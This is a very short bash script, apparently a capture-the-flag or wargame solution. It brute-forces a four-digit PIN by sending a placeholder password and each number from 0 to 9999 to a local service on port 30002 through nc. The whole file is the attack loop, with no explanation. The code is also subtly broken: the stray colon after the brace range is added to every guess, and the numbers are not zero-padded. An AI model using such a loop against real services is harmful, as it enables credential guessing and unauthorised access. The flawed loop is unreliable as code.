#!/bin/bash

for nr in {0..9999}:
do
	echo "<password_here> $nr" | nc localhost 30002
done
	
	
